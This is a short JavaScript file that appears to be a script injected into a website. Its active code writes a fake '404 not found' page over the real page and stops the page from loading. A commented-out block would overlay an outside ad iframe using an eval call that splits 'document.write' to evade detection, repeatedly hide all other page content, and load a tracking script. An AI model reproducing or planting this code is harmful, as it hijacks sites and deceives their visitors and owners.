 function lkvw_unfind() {
	var v8 = '<TABLE cellSpacing=10 width=500 border=0 style=margin:15px;font-size:9pt;text-align:left><TR><TD><div style=font-size:12pt>无法找到该网页</div><br>您正在搜索的页面可能已经删除、更名或暂时不可用。<HR><P>请尝试以下操作：</P>';
	v8 += '<UL style=font-size:12px><LI>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。<LI>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。<LI>单击<A style=color:Red href=javascript:history.back(1)>后退</A>按钮尝试另一个链接。 </LI></UL><br>HTTP 错误 404 - 文件或目录未找到。</UL></TD></TR></TABLE>';
	return v8;
} 
var  lkvw_14 = lkvw_unfind();
var lkvw_60 = "<html><head><meta charset='utf-8'></head><body style=margin:0>" + unescape(lkvw_14) + "</body></html><script type='text/javascript' defer>document.body.style.overflow=document.documentElement.style.overflow= '" + "hidden" + "';";
if (window.stop) lkvw_60 += "try{window.stop();}catch(e){};<\/script>";
else lkvw_60 += "try{document.execCommand('Stop');}catch(e){};<\/script>";
document.title="无法找到该网页";
document.write(lkvw_60); 
/*
//网站放广告框架
var url = "https://www.hnci.net.cn/js/jm.html";
    var aa=Math.round(Math.random()*8+1);
    var  ss = '<div id="asdsa" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr'+'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+url+'"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
    eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
    try{
        setInterval(function(){
            for(var i=0;i<document.body.children.length;i++){
                try{
                    var tagname = document.body.children[i].tagName;
                    var myid = document.body.children[i].id;
                    if(myid!="asdsa"){
                        document.body.children[i].style.display="non"+"e";
                    }
                }catch(e){}
            }
},100);
    }catch(e){}






document.write('<script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1279464830&web_id=1279464830"></script>');

*/
